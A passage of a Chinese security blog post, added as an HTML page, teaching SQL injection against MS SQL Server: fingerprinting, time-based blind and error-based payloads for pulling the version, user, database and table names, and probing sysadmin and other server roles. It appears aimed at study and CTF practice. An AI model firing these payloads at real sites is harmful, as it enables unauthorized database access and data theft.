@@ -1,0 +1,1574 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——其他类型的数据库的注入 | L1uxsn&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——其他类型的数据库的注入`
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://l1uxsn.github.io/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://l1uxsn.github.io/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"SSRF","path":"2026/07/17/SSRF/"},{"title":"pickle反序列化","path":"2026/07/17/pickle反序列化/"},{"title":"nodejs原型链污染","path":"2026/07/17/nodejs原型链污染/"},{"title":"SQL注入相关","path":"2026/07/17/SQL注入相关/"},{"title":"twig与smarty模板的ssti","path":"2026/07/17/twig与smarty模板的ssti/"},{"title":"XXE漏洞","path":"2026/07/17/XXE漏洞/"},{"title":"Linux提权","path":"2026/07/17/Linux提权/"},{"title":"其他类型的数据库的注入","path":"2026/07/17/其他类型的数据库的注入/"},{"title":"python原型链污染","path":"2026/07/17/python原型链污染/"},{"title":"RCE","path":"2025/03/21/RCE/"},{"title":"sql提权","path":"2026/07/17/sql提权/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">L1uxsn.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag"></span>
+          <span class="main-left--tag"></span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“感谢永远有歌把心境道破”</p>
+        <p>“宏愿纵未了,奋斗总不太晚”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://L1uxsn.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>0</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>2 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>11 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1613天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">其他类型的数据库的注入</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-07-17 22:19:31</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="其他类型的数据库的注入"><a href="#其他类型的数据库的注入" class="headerlink" title="其他类型的数据库的注入"></a>其他类型的数据库的注入</h1><h1 id="MS-SQL-Server注入"><a href="#MS-SQL-Server注入" class="headerlink" title="MS SQL Server注入"></a>MS SQL Server注入</h1><h2 id="MS-SQL-Server-数据库介绍"><a href="#MS-SQL-Server-数据库介绍" class="headerlink" title="MS SQL Server 数据库介绍"></a>MS SQL Server 数据库介绍</h2><p>Microsoft SQL Server 是微软开发的关系型数据库管理系统。作为数据库服务器，它是一种软件产品，主要功能是根据其他软件应用程序的请求存储和检索数据，这些应用程序可以在同一台计算机上运行，也可以在网络（包括 Internet）上的另一台计算机上运行。SQL Server 默认开放的端口是 TCP 1433</p>
+<p>它是全球主流的数据库产品之一，与 Oracle、MySQL 并称为三大关系型数据库</p>
+<h2 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h2><table>
+<thead>
+<tr>
+<th>目标信息</th>
+<th>函数</th>
+<th>示例返回值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>当前数据库名</strong></td>
+<td><code>db_name()</code></td>
+<td><code>MyFirstDB</code></td>
+</tr>
+<tr>
+<td><strong>当前用户名</strong></td>
+<td><code>user</code> 或 <code>user_name()</code></td>
+<td><code>dbo</code></td>
+</tr>
+<tr>
+<td><strong>系统登录账户</strong></td>
+<td><code>system_user</code> 或 <code>suser_name()</code></td>
+<td><code>LAPTOP-NQSJIKSS\eason</code></td>
+</tr>
+<tr>
+<td><strong>数据库版本</strong></td>
+<td><code>@@version</code></td>
+<td><code>Microsoft SQL Server 2022...</code></td>
+</tr>
+<tr>
+<td><strong>服务器名</strong></td>
+<td><code>@@servername</code></td>
+<td><code>LAPTOP-NQSJIKSS</code></td>
+</tr>
+<tr>
+<td><strong>当前数据库ID</strong></td>
+<td><code>db_id()</code></td>
+<td><code>5</code></td>
+</tr>
+<tr>
+<td><strong>当前语言</strong></td>
+<td><code>@@language</code></td>
+<td><code>us_english</code></td>
+</tr>
+</tbody></table>
+<h2 id="内置系统表"><a href="#内置系统表" class="headerlink" title="内置系统表"></a>内置系统表</h2><p><strong>Sysdatabases 表</strong></p>
+<p>Sysdatabases 表只保存在 master 数据库中，这个表中保存的是<strong>所有的库名，主要字段有：name 数据库名</strong>。</p>
+<p><strong>Sysobjects表</strong></p>
+<p>SQLServer 中的每个数据库内都有此系统表，存放着数据库所有的表名。主要字段有：<strong>name、id、xtype 分别是表名、表 ID、创建的对象</strong>。当 xtype&#x3D;’U’代表是用户建立的表。</p>
+<p><strong>Syscolumns 表</strong></p>
+<p>Syscolumns 表位于每个数据库中，存放着<strong>数据库所有的字段名。主要字段有：name、id 分别是字段名称、表 ID，其中的 ID 是用 sysobjects 得到的表的 ID 号</strong>。</p>
+<h2 id="SQL-Server信息收集"><a href="#SQL-Server信息收集" class="headerlink" title="SQL Server信息收集"></a>SQL Server信息收集</h2><p><strong>（以数字型注入为例）</strong></p>
+<ul>
+<li>判断数据库类型(探测目标网站是否使用 MSSQL 数据库)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sysobjects 为 MSSQL 数据库中独有的数据表，如果页面返回正常即可表示为 MSSQL 数据库 */</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span><span class="keyword">and</span> 两边的条件同时为真，整个查询才会返回结果</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>sysobjects 是 MSSQL 系统表,每个数据库里都有它</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span><span class="built_in">count</span>(<span class="operator">*</span>) 计算这个表里有多少行记录</span><br><span class="line">整个子查询的结果是一个数字（比如 <span class="number">50</span>、<span class="number">100</span>、<span class="number">200</span>，取决于这个数据库里有多少对象）</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>关键点：只有 MSSQL 数据库才有 sysobjects 这个系统表。MySQL 没有它（MySQL 用的是 information_schema.tables）</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span><span class="operator">&gt;</span><span class="number">0</span>：判断子查询的结果是否大于 <span class="number">0</span>。</span><br><span class="line">因为 sysobjects 表里至少有一条记录（比如之前查到的 TestTable），所以 <span class="built_in">count</span>(<span class="operator">*</span>) 的结果一定大于 <span class="number">0</span>，这个条件永远为真</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span><span class="comment">--:在 SQL 中，-- 表示注释。它会忽略掉原始 SQL 语句后面的所有内容，防止原始语句中的多余代码（比如多余的引号、ORDER BY 等）破坏我们的注入语句</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">/* 通过 MSSQL 数据库中特有的延时函数进行判断(时间盲注)*/</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;WAITFOR DELAY <span class="string">&#x27;00:00:10&#x27;</span>; <span class="comment">-- </span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>; 分隔符。在 MSSQL 中，分号表示一条语句结束，下一条开始，允许你执行多条 <span class="keyword">SQL</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>WAITFOR DELAY <span class="string">&#x27;00:00:10&#x27;</span>	MSSQL 特有的延时命令，让数据库等待 <span class="number">10</span> 秒后再响应</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span><span class="comment">--	注释掉原始 SQL 后面可能存在的多余代码</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/1.png"></p>
+<ul>
+<li>查询数据库版本</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> @<span class="variable">@version</span>) <span class="comment">--</span></span><br><span class="line">MSSQL 报错注入 Payload，目的是利用类型不匹配的错误，直接把数据库版本信息“爆”出来。</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> @<span class="variable">@version</span>)	把 @<span class="variable">@version</span>（字符串）和数字 <span class="number">1</span> 做相等比较</span><br><span class="line"></span><br><span class="line">@<span class="variable">@version</span>:</span><br><span class="line">MSSQL 的系统变量</span><br><span class="line"></span><br><span class="line">返回一个字符串，包含 <span class="keyword">SQL</span> Server 的版本、操作系统版本、补丁信息等</span><br><span class="line"></span><br><span class="line">例如：&quot;Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) ...&quot;</span><br><span class="line"></span><br><span class="line">为什么会报错？</span><br><span class="line"></span><br><span class="line">@<span class="variable">@version</span> 返回的是字符串（如 <span class="string">&#x27;Microsoft SQL Server...&#x27;</span>）</span><br><span class="line"></span><br><span class="line">你拿它和数字 <span class="number">1</span> 做等值比较（<span class="number">1</span> <span class="operator">=</span> 字符串）</span><br><span class="line"></span><br><span class="line">MSSQL 无法将字符串隐式转换为数字，于是抛出类型转换错误,在错误中就会报错出数据库版本信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/2.png"></p>
+<p>具体报错:</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/3.png"></p>
+<ul>
+<li>判断当前数据库用户名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">&gt;</span><span class="number">0</span>;<span class="comment">--</span></span><br><span class="line">利用类型不匹配进行报错注入的经典 Payload，专门用来获取当前数据库用户名</span><br><span class="line"><span class="number">1.</span><span class="keyword">user</span>	MSSQL 的系统函数，返回当前数据库用户名（字符串）</span><br><span class="line"><span class="number">2.</span><span class="operator">&gt;</span><span class="number">0</span>	将字符串和数字 <span class="number">0</span> 进行比较</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/4.png"></p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/5.png"></p>
+<ul>
+<li>获取当前数据库名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> db_name()<span class="operator">&gt;</span><span class="number">0</span>;<span class="comment">--</span></span><br><span class="line">和 <span class="keyword">user</span><span class="operator">&gt;</span><span class="number">0</span> 的原理一样</span><br><span class="line"></span><br><span class="line">db_name():当前数据库的名称</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/6.png"></p>
+<ul>
+<li>判断字段个数</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">6</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>示例表(三段):</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/7.png"></p>
+<p>order by查询:</p>
+<p>4:</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/8.png"></p>
+<p>3:</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/9.png"></p>
+<ul>
+<li>查询当前的本地服务名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> @<span class="variable">@servername</span>)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">@<span class="variable">@servername</span>:</span><br><span class="line">MSSQL 系统变量</span><br><span class="line">返回 <span class="keyword">SQL</span> Server 实例的名称</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/10.png"></p>
+<ul>
+<li>判断当前服务器级别角色（Server-level roles）(MSSQL 权限探测,判断当前数据库账户属于哪些服务器角色)</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;serveradmin&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;securityadmin&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;processadmin&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;setupadmin&#x27;</span>))<span class="comment">-- </span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;bulkadmin&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;diskadmin&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;dbcreator&#x27;</span>))<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;public&#x27;</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>is_srvrolemember函数介绍:</strong></p>
+<p><code>is_srvrolemember(&#39;角色名&#39;)</code> 是 MSSQL 的内置函数，用于判断当前用户是否属于指定的服务器角色。</p>
+<table>
+<thead>
+<tr>
+<th align="left">返回值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>1</code></td>
+<td align="left">是，当前用户属于该角色</td>
+</tr>
+<tr>
+<td align="left"><code>0</code></td>
+<td align="left">否，不属于</td>
+</tr>
+<tr>
+<td align="left"><code>NULL</code></td>
+<td align="left">角色名无效</td>
+</tr>
+</tbody></table>
+<p><strong>服务器角色及其权限（从高到低）</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">角色名</th>
+<th align="left">权限说明</th>
+<th align="left">注入中的意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>sysadmin</strong></td>
+<td align="left">系统管理员，<strong>最高权限</strong>，可做任何操作</td>
+<td align="left">拿到这个权限 ≈ 拿下整个服务器</td>
+</tr>
+<tr>
+<td align="left"><strong>serveradmin</strong></td>
+<td align="left">可修改服务器配置（启动&#x2F;停止、设置参数等）</td>
+<td align="left">可以搞瘫痪服务器</td>
+</tr>
+<tr>
+<td align="left"><strong>securityadmin</strong></td>
+<td align="left">可管理登录账户、权限</td>
+<td align="left">可以创建新账户并提权</td>
+</tr>
+<tr>
+<td align="left"><strong>processadmin</strong></td>
+<td align="left">可终止数据库进程</td>
+<td align="left">可以搞 DoS 攻击</td>
+</tr>
+<tr>
+<td align="left"><strong>setupadmin</strong></td>
+<td align="left">可配置链接服务器、存储过程</td>
+<td align="left">可能执行系统命令</td>
+</tr>
+<tr>
+<td align="left"><strong>bulkadmin</strong></td>
+<td align="left">可执行 <code>BULK INSERT</code>（批量导入文件）</td>
+<td align="left">可能读取系统文件</td>
+</tr>
+<tr>
+<td align="left"><strong>diskadmin</strong></td>
+<td align="left">可管理磁盘文件</td>
+<td align="left">可能读取&#x2F;写入文件</td>
+</tr>
+<tr>
+<td align="left"><strong>dbcreator</strong></td>
+<td align="left">可创建、更改、删除数据库</td>
+<td align="left">权限较大，但不如 sysadmin</td>
+</tr>
+<tr>
+<td align="left"><strong>public</strong></td>
+<td align="left">所有用户都有的<strong>默认角色</strong>，权限最小</td>
+<td align="left">返回值永远是 1（人人都是 public）</td>
+</tr>
+</tbody></table>
+<hr>
+<p>示例:</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/11.png"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>原理:MSSQL 数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。前提是服务器允许返回报错信息</strong></p>
+<ul>
+<li>查询当前数据库中的表名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>);<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span> 